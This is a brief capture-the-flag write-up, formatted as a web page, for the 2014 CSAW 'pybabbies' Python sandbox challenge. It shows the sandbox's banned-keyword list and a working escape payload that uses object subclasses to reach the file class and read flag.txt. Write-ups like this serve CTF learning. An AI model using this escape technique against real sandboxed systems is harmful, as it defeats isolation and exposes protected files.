<!doctype html>
<html lang="en">
<head>
	<title>2014 CSAW CTF - Exploitation 200 - pybabbies</title>
	<link href="all.min.css" rel="stylesheet" type="text/css" />
	<link href='http://fonts.googleapis.com/css?family=Ubuntu+Mono:400' rel='stylesheet' type='text/css'>
	<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
	<meta charset="utf-8">
	<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
</head>
<body>
	<div id="content">
	  <div id="post">
		<h1>2014 CSAW CTF - Exploitation 200 - pybabbies</h1>
		<!--<div id="postinfo">
		  <div id="postdate"></div>
		  <div id="posttags">tags: <a href="/tags/X"></a></div>
		</div>-->
		<div id="postbody">
<ol>
<li>given source code of Python sandbox <code>pyshell.py</code>, need to find key</li>
<li>inspecting reveals all <code>__builtins__</code> have been cleared, except <code>raw_input</code> and <code>print</code>;<br> additionally "sys" being banned means "system" cannot be used as well;<br> matches are also case-insensitive;<br> if all these checks pass, then the input command string is <code>exec</code>'ed</li>
<li>refactored the given pyshell.py file to facilitate local testing</li>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28</pre></div></td><td class="code"><div class="highlight"><pre><span class="c">#!/usr/bin/env python</span>
<span class="c">#-*- coding: utf-8 -*-</span>

<span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">print_function</span>

<span class="k">print</span><span class="p">(</span><span class="s">&quot;Welcome to my Python sandbox! Enter commands below!&quot;</span><span class="p">)</span>
<span class="n">banned</span> <span class="o">=</span> <span class="p">[</span><span class="s">&quot;import&quot;</span><span class="p">,</span> <span class="s">&quot;exec&quot;</span><span class="p">,</span> <span class="s">&quot;eval&quot;</span><span class="p">,</span> <span class="s">&quot;pickle&quot;</span><span class="p">,</span> <span class="s">&quot;os&quot;</span><span class="p">,</span> <span class="s">&quot;subprocess&quot;</span><span class="p">,</span>
	<span class="s">&quot;kevin sucks&quot;</span><span class="p">,</span> <span class="s">&quot;input&quot;</span><span class="p">,</span> <span class="s">&quot;banned&quot;</span><span class="p">,</span> <span class="s">&quot;cry sum more&quot;</span><span class="p">,</span> <span class="s">&quot;sys&quot;</span><span class="p">]</span>
<span class="n">targets</span> <span class="o">=</span> <span class="n">__builtins__</span><span class="o">.</span><span class="n">__dict__</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span>
<span class="n">targets</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s">&#39;raw_input&#39;</span><span class="p">)</span>
<span class="n">targets</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s">&#39;print&#39;</span><span class="p">)</span>
<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">targets</span><span class="p">:</span> <span class="k">del</span> <span class="n">__builtins__</span><span class="o">.</span><span class="n">__dict__</span><span class="p">[</span><span class="n">x</span><span class="p">]</span>
<span class="n">stmts</span> <span class="o">=</span> <span class="p">[</span>
<span class="s">&quot;print({}.__class__.__bases__[0].__subclasses__()[40](&#39;./flag.txt&#39;).read())&quot;</span>
<span class="p">]</span>
<span class="c">#while 1:</span>
<span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">for</span> <span class="n">data</span> <span class="ow">in</span> <span class="n">stmts</span><span class="p">:</span>
<span class="c">#	print(&quot;&gt;&gt;&gt;&quot;, end=&#39; &#39;)</span>
<span class="c">#	data = raw_input()</span>
	<span class="k">for</span> <span class="n">no</span> <span class="ow">in</span> <span class="n">banned</span><span class="p">:</span>
		<span class="k">if</span> <span class="n">no</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">in</span> <span class="n">data</span><span class="o">.</span><span class="n">lower</span><span class="p">():</span>
			<span class="k">print</span><span class="p">(</span><span class="s">&quot;offending term: &quot;</span><span class="o">+</span><span class="n">no</span><span class="p">)</span>
			<span class="k">break</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="s">&quot;:&quot;</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
		<span class="k">exec</span> <span class="n">data</span>
	<span class="n">i</span><span class="o">+=</span><span class="mi">1</span>
</pre></div>
</td></tr></table>
<li>line#14 could instead be <code>().__class__...</code>, to access the base class of <code>tuple</code> instead of <code>dict</code>;<br> 40 is the index into <code>file</code>;<br> so the overall command is just reading the contents of that file</li>

<li>guessed rightly that filename is <i>flag.txt</i>; otherwise would have tried <i>key.txt</i></li>
<li>flag{<span class="flag">definitely_not_intro_python</span>}</li>
</ol>
		</div>
	</div>
</body>
</html>
